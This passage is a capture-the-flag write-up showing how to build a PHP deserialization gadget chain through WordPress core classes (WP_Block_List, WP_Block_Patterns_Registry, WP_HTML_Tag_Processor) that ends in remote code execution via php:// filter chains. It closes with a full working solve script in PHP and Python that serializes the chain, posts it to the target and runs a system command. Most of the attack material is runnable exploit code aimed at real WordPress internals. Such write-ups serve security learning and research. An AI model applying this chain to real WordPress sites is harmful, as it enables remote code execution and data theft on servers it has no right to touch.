    && rm latest.tar.gz \
    && chown -R www-data:www-data /var/www/html \
    && chmod -R 755 /var/www/html

# Install WP-CLI
RUN curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar \
    && chmod +x wp-cli.phar \
    && mv wp-cli.phar /usr/local/bin/wp-cli
```

So it installs the latest version `6.8.2` from now. I started researching and came across this interesting post: https://sec.vnpt.vn/2025/06/Mot-vai-note-ve-Wordpress-POP-chain. This is the Wordpress gadget chain exploit that VNPT Cyber Immunity just posted recently. So now what we can exploit from here.

From this, the potential exploitation path becomes clearer. The gadget chain split to 2 parts: 

* Sink dectection
* Wordpress core gadget chain

### Wordpress core gadget chain

First, let’s dive into the WordPress core gadget chain. Based on the referenced post, the chain looks like this:

`WP_Block_List -> WP_Block -> WP_Block_Patterns_Registry`

Let’s start with the WP_Block_List class. At first glance, it requires three argument:

```php
public function __construct( $blocks, $available_context = array(), $registry = null ) {
    if ( ! $registry instanceof WP_Block_Type_Registry ) {
        $registry = WP_Block_Type_Registry::get_instance();
    }

    $this->blocks            = $blocks;
    $this->available_context = $available_context;
    $this->registry          = $registry;
}
```

for debugging we can set it like

```php
$a = new WP_Block_List("1","2","3");
```

Next we can see the WP_Block_List use ArrayAccess

```php
interface ArrayAccess
{
	#region Functions

	/**
	 * Whether an offset exists
	 * Whether or not an offset exists.
	 *
	 * @param mixed $offset An offset to check for.
	 * @return bool Returns `true` on success or `false` on failure.
	 */
	function offsetExists(mixed $offset): bool;

	/**
	 * Offset to retrieve
	 * Returns the value at specified offset.
	 *
	 * @param mixed $offset The offset to retrieve.
	 * @return TValue Can return all value types.
	 */
	function offsetGet(mixed $offset): mixed;

	/**
	 * Assigns a value to the specified offset.
	 *
	 * @param TKey $offset The offset to assign the value to.
	 * @param TValue $value The value to set.
	 * @return void No value is returned.
	 */
	function offsetSet(mixed $offset, mixed $value): void;

	/**
	 * Unsets an offset.
	 *
	 * @param TKey $offset The offset to unset.
	 * @return void No value is returned.
	 */
	function offsetUnset(mixed $offset): void;

	#endregion
}
```

so we access to an index like as an array to WP_Block_List

```php
$a = new WP_Block_List("1","2","3");
$a[0];
```

![image](https://hackmd.io/_uploads/Hk-fhsVFlg.png)


It works, but `blocks[0]` must be an array

```php
$b = array('1');
$a = new WP_Block_List($b,"2","3");
$a[0];
```

![image](https://hackmd.io/_uploads/BJ5ihiEteg.png)

Nice now we create a `WP_Block` class, so what next, in `WP_Block`, the __construct function will be called

```php
public function __construct( $block, $available_context = array(), $registry = null ) {
    $this->parsed_block = $block;
    $this->name         = $block['blockName'];

    if ( is_null( $registry ) ) {
        $registry = WP_Block_Type_Registry::get_instance();
    }

    $this->registry = $registry;

    $this->block_type = $registry->get_registered( $this->name );

    $this->available_context = $available_context;

    $this->refresh_context_dependents();
}
```

Inside the `WP_Block` constructor, a new `WP_Block_Type_Registry` is created and its get_registered() function is called. That part doesn’t give us much to work with.

However, things get more interesting with the get_registered() function of the `WP_Block_Patterns_Registry` class. If we can control the $registry property and set it to an instance of WP_Block_Patterns_Registry, then instead of calling the default WP_Block_Type_Registry, the execution flow will pivot into `WP_Block_Patterns_Registry::get_registered()`.

This redirection is what allows us to move deeper into the gadget chain.

```php
class WP_Block_Patterns_Registry{

}

class WP_Block_List{
    public function __construct( $blocks, $available_context = array(), $registry = null ) {
		$this->blocks            = $blocks;
		$this->available_context = $available_context;
		$this->registry          = $registry;
	}
}

$b = array('1');
$c = new WP_Block_Patterns_Registry();
$a = new WP_Block_List(array($b),"2",$c);
```

![image](https://hackmd.io/_uploads/SJndehNFxg.png)

Nice it jumps to this, but `$pattern_name` is not registered so it will return immediately. The `$pattern_name` will use `$this->name` which is `$block['blockName']` so we will have

```php
class WP_Block_Patterns_Registry{
    public $registered_patterns = array('hehe' => 1);
}

class WP_Block_List{
    public function __construct( $blocks, $available_context = array(), $registry = null ) {
		$this->blocks            = $blocks;
		$this->available_context = $available_context;
		$this->registry          = $registry;
	}
}

$b = array("blockName" => "hehe");
```

![image](https://hackmd.io/_uploads/BkUF7nEFex.png)

Nice now we jump to `get_content`. You see the the include function ? This can leads to LFI bug but with `php://` wrapper we can get RCE: https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html

Now we can easily use this tool to create our filter chain https://github.com/synacktiv/php_filter_chain_generator

```php
class WP_Block_Patterns_Registry{
    public $registered_patterns = array('hehe' => array('filePath' => <payload>));
}

class WP_Block_List{
    public function __construct( $blocks, $available_context = array(), $registry = null ) {
		$this->blocks            = $blocks;
		$this->available_context = $available_context;
		$this->registry          = $registry;
	}
}
        
$b = array("blockName" => "hehe");
$c = new WP_Block_Patterns_Registry();
$a = new WP_Block_List(array($b),"2",$c);
```

![image](https://hackmd.io/_uploads/HySPDhNFee.png)

Now we have curl function works in the server.

### The question ?

Why we need `WP_Block_List` ???

Because it will call the `__construct` of `WP_Block` which is a part of gadget chain. If we just unserialize `WP_Block` but not using `WP_Block_List` we will trigger `__unserialize` method not `__construct`

### Sink dectection

Now, going back to the challenge, the next step is to identify the sink. According to Hint 2, we should focus on the __toString() function.

![image](https://hackmd.io/_uploads/BJr6U34tge.png)

Now take a look at `WP_HTML_Tag_Processor`, we have

```php
public function __toString(): string {
    return $this->get_updated_html();
}
```

This will calls `get_updated_html()` function

```php
public function get_updated_html(): string {
    $requires_no_updating = 0 === count( $this->classname_updates ) && 0 === count( $this->lexical_updates );

    /*
     * When there is nothing more to update and nothing has already been
     * updated, return the original document and avoid a string copy.
     */
    if ( $requires_no_updating ) {
        return $this->html;
    }

    /*
     * Keep track of the position right before the current tag. This will
     * be necessary for reparsing the current tag after updating the HTML.
     */
    $before_current_tag = $this->token_starts_at ?? 0;

    /*
     * 1. Apply the enqueued edits and update all the pointers to reflect those changes.
     */
    $this->class_name_updates_to_attributes_updates();

...
```

Next is `class_name_updates_to_attributes_updates`

```php
private function class_name_updates_to_attributes_updates(): void {
    if ( count( $this->classname_updates ) === 0 ) {
        return;
    }

    $existing_class = $this->get_enqueued_attribute_value( 'class' );
    if ( null === $existing_class || true === $existing_class ) {
        $existing_class = '';
    }

    if ( false === $existing_class && isset( $this->attributes['class'] ) ) {
        $existing_class = substr(
            $this->html,
            $this->attributes['class']->value_starts_at,
            $this->attributes['class']->value_length
        );
    }

...
```

From now, we can easily see that it will calles `$this->attributes['class']` and if we set `attributes` to `WP_Block_List`, gadget chain starts

```php
class WP_Block_Patterns_Registry{
    public $registered_patterns = array('hehe' => array('filePath' => <payload>;
}

class WP_Block_List{
    public function __construct( $blocks, $available_context = array(), $registry = null ) {
		$this->blocks            = $blocks;
		$this->available_context = $available_context;
		$this->registry          = $registry;
	}
}

class WP_HTML_Tag_Processor{
    public $html = 'huhu';
    public $parsing_namespace = 'html';
    public $attributes = array();
    public $classname_updates = [1];
    public function __construct($attributes){
        $this->attributes = $attributes;
    }
}

$b = array("blockName" => "hehe");
$c = new WP_Block_Patterns_Registry();
$a = new WP_Block_List(array("class" => $b),"2",$c);
$d = new WP_HTML_Tag_Processor($a);
```

we can use `echo $object` to trigger `__toString` method.

![image](https://hackmd.io/_uploads/SJTzo24Fll.png)

And yeah we now have `WP_Block_List` in `this->attributes`

Ok now we have `__toString` method leads to RCE, but where will trigger it ?? Look at the first hint

![image](https://hackmd.io/_uploads/BJ2kThVFex.png)

the function `in_array` looks suspicious, we have a small test like this

```php
<?php
class Test{
    public function __toString(){
        echo "Ok toString() triggered";
        return "";
    }
}
$arr = ["1","2"];
$a = new Test();
echo in_array($a, $arr);
?>
```

![image](https://hackmd.io/_uploads/HyFcT24Fex.png)

ok now we have `__toString` when use `in_array` function. Let's put it all together

we can see `in_array` in `resetSecurityProperties` of `SecureTableGenerator`

```php
private function resetSecurityProperties()
{

    // Validate allowed tags
    $safeTags = ['b', 'i', 'strong', 'em', 'u', 'span', 'div', 'p'];
    $validatedTags = [];

    foreach ($this->allowedTags as $tag) {
        if (in_array($tag, $safeTags)) {
            $validatedTags[] = $tag;
        }
    }

    $this->allowedTags = $validatedTags ?: ['b', 'i', 'strong', 'em', 'u'];
}
```

From this, we also have `SecureTableGenerator` in gadget chain and we need to overwrite its `allowedTags`

```php
class WP_Block_Patterns_Registry{
    public $registered_patterns = array('hehe' => array('filePath' => <payload>));
}

class WP_Block_List{
    public function __construct( $blocks, $available_context = array(), $registry = null ) {
		$this->blocks            = $blocks;
		$this->available_context = $available_context;
		$this->registry          = $registry;
	}
}

class WP_HTML_Tag_Processor{
    public $html = 'huhu';
    public $parsing_namespace = 'html';
    public $attributes = array();
    public $classname_updates = [1];
    public function __construct($attributes){
        $this->attributes = $attributes;
    }
}

class SecureTableGenerator{
    public function __construct($tag){
        $this->allowedTags = array($tag);
    } 
}

$b = array("blockName" => "hehe");
$c = new WP_Block_Patterns_Registry();
$a = new WP_Block_List(array("class" => $b),"2",$c);
$d = new WP_HTML_Tag_Processor($a);
$e = new SecureTableGenerator($d);
```

From now, we can achieve RCE and leak information by writing it into the `wp-content/uploads` directory.

![image](https://hackmd.io/_uploads/rkROcTNtee.png)


Full solve script:

* [php_filter_chain_generator.py](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py)
* chain.php

```php
<?php

class WP_Block_Patterns_Registry{
    
    public function __construct($payload) {
		$this -> registered_patterns = array('hehe' => array('filePath' => $payload));
	}
}

class WP_Block_List{
    public function __construct( $blocks, $available_context = array(), $registry = null ) {
		$this->blocks            = $blocks;
		$this->available_context = $available_context;
		$this->registry          = $registry;
	}
}

class WP_HTML_Tag_Processor{
    public $html = 'huhu';
    public $parsing_namespace = 'html';
    public $attributes = array();
    public $classname_updates = [1];
    public function __construct($attributes){
        $this->attributes = $attributes;
    }
}

class SecureTableGenerator{
    public function __construct($tag){
        $this->allowedTags = array($tag);
    } 
}

$b = array("blockName" => "hehe");
$c = new WP_Block_Patterns_Registry($argv[1]);
$a = new WP_Block_List(array("class" => $b),"2",$c);
$d = new WP_HTML_Tag_Processor($a);
$e = new SecureTableGenerator($d);
echo base64_encode(serialize($e));

?>
```
* solve.py
```python
import requests
import subprocess

URL = "http://localhost/"

payload = '<?php system("cat /flag* / > /var/www/html/wp-content/uploads/huhu.txt");?>'

res = subprocess.run(['python3', 'php_filter_chain_generator.py', '--chain', payload], capture_output=True, text=True)
gadget = res.stdout.split('\n', 1)[1]

res = subprocess.run(['php', 'chain.php', gadget], capture_output=True, text=True)
b64_ser = res.stdout

def trigger():
    data = {
        'serialized_data':b64_ser, 
        'generate': 1
    }
    r = requests.post(URL, data=data)

def read_flag():
    r = requests.get(URL + "wp-content/uploads/huhu.txt")
    print(r.text)

trigger()
read_flag()
```